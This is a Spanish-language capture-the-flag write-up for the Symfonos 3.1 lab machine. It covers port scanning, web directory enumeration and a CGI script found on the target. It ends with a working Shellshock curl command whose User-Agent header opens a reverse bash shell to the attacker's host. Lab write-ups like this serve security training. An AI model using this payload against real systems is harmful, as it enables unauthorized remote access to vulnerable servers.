# SYMFONOS3.1
Desarrollo del CTF SYMFONOS 3.1

## 1. Configuración de la VM

- Descargar la máquina virtual: https://www.vulnhub.com/entry/symfonos-31,332/

Importante: La versión 3.1 tiene BUGS y no he logrado resolverlo por completo.

## 2. Escaneo de Puertos


```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.153
Nmap scan report for 10.10.10.153
Host is up (0.00047s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:24:A1:3E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos1.jpg" width=80% />

## 3. Enumeración 

### 3.1. Enumeración HTTP

- En el código HTML vemos un mensaje comentado: <!-- Can you bust the underworld? --> 

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos2.jpg" width=80% />

- Ejecutamos GOBUSTER y DIRSEARCH

```
root@kali:~/tools/dirsearch# python3 dirsearch.py -u http://10.10.10.154/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163783

Error Log: /root/tools/dirsearch/logs/errors-21-04-04_14-12-38.log

Target: http://10.10.10.154/

Output File: /root/tools/dirsearch/reports/10.10.10.154/_21-04-04_14-12-38.txt

[14:12:38] Starting: 
[14:12:38] 403 -  277B  - /.htaccess.html
[14:12:38] 403 -  277B  - /.htaccess.php
[14:12:38] 403 -  277B  - /.htaccess.asp
[14:12:38] 403 -  277B  - /.htaccess.jsp
[14:12:38] 403 -  277B  - /.htaccess.aspx
[14:12:38] 403 -  277B  - /.htpasswd.html
[14:12:38] 403 -  277B  - /.htpasswd.txt
[14:12:38] 403 -  277B  - /.htpasswd.php
[14:12:38] 403 -  277B  - /.htpasswd.asp
[14:12:38] 403 -  277B  - /.htpasswd.aspx
[14:12:38] 403 -  277B  - /.htpasswd.jsp
[14:13:25] 403 -  277B  - /cgi-bin/     (Added to queue)
[14:14:14] 301 -  311B  - /gate  ->  http://10.10.10.154/gate/     (Added to queue)
[14:14:14] 200 -  202B  - /gate/
[14:14:27] 403 -  277B  - /icons/     (Added to queue)
[14:14:31] 200 -  241B  - /index.html
[14:15:55] 403 -  277B  - /server-status
[14:15:55] 403 -  277B  - /server-status/     (Added to queue)
[14:16:45] Starting: cgi-bin/
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.html
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.asp
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.aspx
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.php
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.jsp
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.txt
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.asp
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.php
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.aspx
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.html
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.jsp
[14:20:41] Starting: gate/
[14:20:41] 403 -  277B  - /gate/.htaccess.php
[14:20:41] 403 -  277B  - /gate/.htaccess.asp
[14:20:41] 403 -  277B  - /gate/.htaccess.html
[14:20:41] 403 -  277B  - /gate/.htaccess.aspx
[14:20:41] 403 -  277B  - /gate/.htaccess.jsp
[14:20:41] 403 -  277B  - /gate/.htpasswd.txt
[14:20:41] 403 -  277B  - /gate/.htpasswd.html
[14:20:41] 403 -  277B  - /gate/.htpasswd.aspx
[14:20:41] 403 -  277B  - /gate/.htpasswd.asp
[14:20:41] 403 -  277B  - /gate/.htpasswd.php
[14:20:41] 403 -  277B  - /gate/.htpasswd.jsp
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos3.jpg" width=80% />

- A través de FTP y SSH no podemos enumerar nada. No tenemos otro punto para probar mas accesos. Toca buscar con mas profundidad sobre las dos carpetas identificadas: CGI-BIN y GATE.

> Encontramos un script CGI para ejecutar: /cgi-bin/underworld

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos4.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos5.jpg" width=80% />

## 4. Explotación de Vulnerabilidad

- Si tenemos un SCRIPT CGI lo primero que debemos pensar es en SHELLSHOCK.

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos6.jpg" width=80% />

- Obtenemos conexión reversa a través de SHELLSHOCK.

```
root@kali:~# curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.133/443 0>&1" http://10.10.10.154/cgi-bin/underworld
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos7.jpg" width=80% />











